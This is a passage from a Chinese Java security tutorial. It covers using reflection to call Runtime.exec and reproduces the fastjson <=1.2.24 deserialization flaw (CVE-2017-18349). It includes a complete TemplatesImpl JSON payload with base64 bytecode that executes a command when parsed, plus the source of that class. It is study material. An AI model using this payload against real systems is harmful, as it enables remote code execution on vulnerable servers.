class="line">        <span class="comment">// 获取Person类的Class对象</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.example.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建Person对象</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">person</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;张三&quot;</span>, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用Person对象的sayHello方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">        method.invoke(person);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改Person对象的age属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(person, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出修改后的Person对象信息</span></span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就可以来动态创建对象、调用方法以及修改属性等。</p>
<h4 id="问题：我还是觉得你给出的例子体现不出灵活，怎么办？"><a href="#问题：我还是觉得你给出的例子体现不出灵活，怎么办？" class="headerlink" title="问题：我还是觉得你给出的例子体现不出灵活，怎么办？"></a>问题：我还是觉得你给出的例子体现不出灵活，怎么办？</h4><p>不急，我们来看这么个例子：<br>假设我们有一个配置文件，里面记录了类的名称、方法名、属性名等信息，我们可以在运行时读取配置文件，然后使用<code>Java</code>反射机制来创建对象、调用方法、修改属性等。这样就可以实现在不修改代码的情况下，根据配置文件来动态地创建对象、调用方法、修改属性，这样不就是很灵活很方便了么？我们来尝试用代码实现下。<br>先建立一个配置文件，比如叫做<code>config.properties</code>，填写如下信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class=org.example.Person</span><br><span class="line">method=sayHello</span><br><span class="line">field=age</span><br><span class="line">value=<span class="number">30</span></span><br><span class="line">name=W01fh4cker</span><br></pre></td></tr></table></figure>
<p>然后修改<code>Main.java</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 读取配置文件</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        props.load(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;config.properties&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取类的名称、方法名、属性名、属性值、姓名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;method&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fieldName</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;field&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fieldValue</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> props.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取类的Class对象</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(className);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取类的有参构造方法</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建类的对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(name, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(methodName);</span><br><span class="line">        method.invoke(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, Integer.parseInt(fieldValue));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出修改后的对象信息</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果为：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276045777-f76ed6d9-b4d6-4e9d-839c-30f5ecfdd0be.png#averageHue=%23f9f7f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u5a11505a&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=209693&status=done&style=none&taskId=uf3c6207e-0ec8-46c8-8ada-0ce738578e6&title=&width=1536" alt="image.png"></p>
<h3 id="（2）【关键！】和漏洞之间的联系？"><a href="#（2）【关键！】和漏洞之间的联系？" class="headerlink" title="（2）【关键！】和漏洞之间的联系？"></a>（2）【关键！】和漏洞之间的联系？</h3><p>前面讲了这么多关于反射的内容，可能很多初学者和我现在一样，处于一脸懵逼的状态，为什么要用到反射，而不是直接调用<code>java.lang.runtime</code>来执行命令？<br>例如我们平时经常这么玩：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(IOUtils.toString(Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>).getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要运行上述代码，需要在maven中引入如下依赖：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.11</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，要在上述依赖的上线加入<code>&lt;dependencies&gt;&lt;/dependencies&gt;</code>，如下图，然后点击如下图标来自动安装依赖：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276780188-ce707c15-4872-44bc-8f69-9aa3abb27ca5.png#averageHue=%23fbfafa&clientId=ud95377f6-2eb9-4&from=paste&height=481&id=ud3f79683&name=image.png&originHeight=601&originWidth=1386&originalType=binary&ratio=1.25&rotation=0&showTitle=true&size=66917&status=done&style=none&taskId=uc1835653-ba55-436a-9f60-4f526b665c7&title=%E6%AD%A4%E5%9B%BE%E6%98%AF%E5%90%8E%E6%9D%A5%E8%A1%A5%E7%9A%84%EF%BC%8C%E6%80%95%E8%90%8C%E6%96%B0%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%85maven%E4%BE%9D%E8%B5%96&width=1108.8" alt="image.png" title="此图是后来补的，怕萌新不知道怎么快速安装maven依赖"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276729720-36a6756c-9064-4b40-94bf-6308bd29e040.png#averageHue=%23f9f9f8&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u7768c829&name=a4218697fec3a30e3ce077ccb178fbe.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=true&size=127735&status=done&style=none&taskId=u83af4e91-9633-4d94-a87f-67085301d4f&title=%E5%B7%A6%E4%B8%8B%E6%96%B9%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%AD%A3%E5%9C%A8%E4%B8%8B%E8%BD%BD%E4%BE%9D%E8%B5%96&width=1536" alt="a4218697fec3a30e3ce077ccb178fbe.png" title="左下方可以看到正在下载依赖"><br>然后运行程序，就会弹出计算器了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680276862711-f45e3255-7f60-419f-b05f-f14e7bfa2872.png#averageHue=%23f7f7f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u0b8d64f7&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=179612&status=done&style=none&taskId=u634c0f95-8cd8-447f-aeef-7678439b0ee&title=&width=1536" alt="image.png"><br>这么做不就是可以执行命令了吗，为什么还要搞反射呢？<br><strong>原来，</strong><code>**Java**</code><strong>安全机制会对代码的执行进行限制，例如限制代码的访问权限、限制代码的资源使用等。如果代码需要执行一些危险的操作，例如执行系统命令，就需要获取</strong><code>**Java**</code><strong>的安全权限。获取</strong><code>**Java**</code><strong>的安全权限需要经过一系列的安全检查，例如检查代码的来源、检查代码的签名等。如果代码没有通过这些安全检查，就无法获取</strong><code>**Java**</code><strong>的安全权限，从而无法执行危险的操作。然而，反射机制可以绕过</strong><code>**Java**</code><strong>安全机制的限制，比如可以访问和修改类的私有属性和方法，可以调用类的私有构造方法，可以创建和访问动态代理对象等。这些操作都是</strong><code>**Java**</code><strong>安全机制所禁止的，但是反射机制可以绕过这些限制，从而执行危险的操作。</strong><br>原来如此！好了，现在来学习如何使用反射调用<code>java.lang.runtime</code>来执行命令，由于Java9之后，模块化系统被引入，模块化系统会限制反射的使用，从而提高<code>Java</code>应用程序的安全性，因此我们要区分版本来学习！为了方便演示，我重新建立了一个项目，并使用<code>Java8</code>。<br>我们先看如下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java version: 8</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) execMethod.invoke(Runtime.getRuntime(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成功执行：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680277763641-372fcf97-9671-4916-9063-71b32b4ca4dc.png#averageHue=%23f7f7f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u7229a943&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=193286&status=done&style=none&taskId=u27a74f91-68b8-4ccd-a609-52611a84a9b&title=&width=1536" alt="image.png"><br>然后再看在<code>Java17</code>下的执行反射的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// // Java version: 17</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.invoke.MethodHandle;</span><br><span class="line"><span class="keyword">import</span> java.lang.invoke.MethodHandles;</span><br><span class="line"><span class="keyword">import</span> java.lang.invoke.MethodType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 获取Runtime类对象</span></span><br><span class="line">        Class&lt;?&gt; runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">MethodHandle</span> <span class="variable">execMethod</span> <span class="operator">=</span> MethodHandles.lookup().findVirtual(runtimeClass, <span class="string">&quot;exec&quot;</span>, MethodType.methodType(Process.class, String.class));</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) execMethod.invokeExact(Runtime.getRuntime(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行结果：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680278080283-7812f55e-015f-47a2-a195-72427beac360.png#averageHue=%23f7f6f4&clientId=ud95377f6-2eb9-4&from=paste&height=819&id=u67b7cb21&name=image.png&originHeight=1024&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210532&status=done&style=none&taskId=u48718344-5315-40b3-8edc-a6d96955e58&title=&width=1536" alt="image.png"></p>
<h1 id="二、漏洞学习"><a href="#二、漏洞学习" class="headerlink" title="二、漏洞学习"></a>二、漏洞学习</h1><h2 id="1-fastjson"><a href="#1-fastjson" class="headerlink" title="1. fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349）（学习TemplatesImpl链的相关知识）"></a>1. fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349）（学习TemplatesImpl链的相关知识）</h2><h3 id="（1）漏洞简单复现"><a href="#（1）漏洞简单复现" class="headerlink" title="（1）漏洞简单复现"></a>（1）漏洞简单复现</h3><p>我们看以下案例：<br>首先创建一个<code>maven</code>项目、导入<code>Fastjson1.2.23</code>并自动下载相关依赖（怎么自动下载的见上文配图）：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680362559966-b2204359-9c98-40ab-bbe4-2a4edda1caaf.png#averageHue=%23f9f8f6&clientId=ud95377f6-2eb9-4&from=paste&height=818&id=u7bb5dc5f&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=145481&status=done&style=none&taskId=ub1d23e6a-5fd8-483e-8b6f-fc3fc32970d&title=&width=1536" alt="image.png"><br>然后写入如下代码至<code>Main.java</code>（此时已经不需要<code>Person.java</code>了）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行之后直接弹出计算器：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680531505319-fa84e999-7bcc-4ab6-88d1-19f1320c3600.png#averageHue=%23cdbd80&clientId=u8272b843-0f56-4&from=paste&height=823&id=uc52db734&name=image.png&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=341524&status=done&style=none&taskId=u0e020ad7-3fe4-46d4-94ec-9f98e57fb3b&title=&width=1536" alt="image.png"></p>
<h3 id="（2）漏洞成因分析"><a href="#（2）漏洞成因分析" class="headerlink" title="（2）漏洞成因分析"></a>（2）漏洞成因分析</h3><p>上面的<code>text</code>里面的<code>_bytecodes</code>的内容是以下内容编译成字节码文件后（<code>.class</code>）再<code>base64</code>编码后的结果：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，我们通过以上代码直接定义类<code>Test</code>，并在类的构造方法中执行<code>calc</code>的命令；至于为什么要写上述代码的第<code>14</code>-<code>21</code>行，因为<code>Test</code>类是继承<code>AbstractTranslet</code>的，上述代码的两个<code>transform</code>方法都是实现<code>AbstractTranslet</code>接口的抽象方法，因此都是需要的；具体来说的话，第一个<code>transform</code>带有<code>SerializationHandler</code>参数，是为了把<code>XML</code>文档转换为另一种格式，第二个<code>transform</code>带有<code>DTMAxisIterator</code>参数，是为了对<code>XML</code>文档中的节点进行迭代。<br><strong>总结：</strong>对于上述代码，应该这么理解：建立<code>Test</code>类，并让其继承<code>AbstractTranslet</code>类，然后通过<code>Test t = new Test();</code>来初始化，这样我就是假装要把<code>xml</code>文档转换为另一种格式，在此过程中会触发构造方法，而我在构造方法中的代码就是执行<code>calc</code>，所以会弹出计算器。</p>
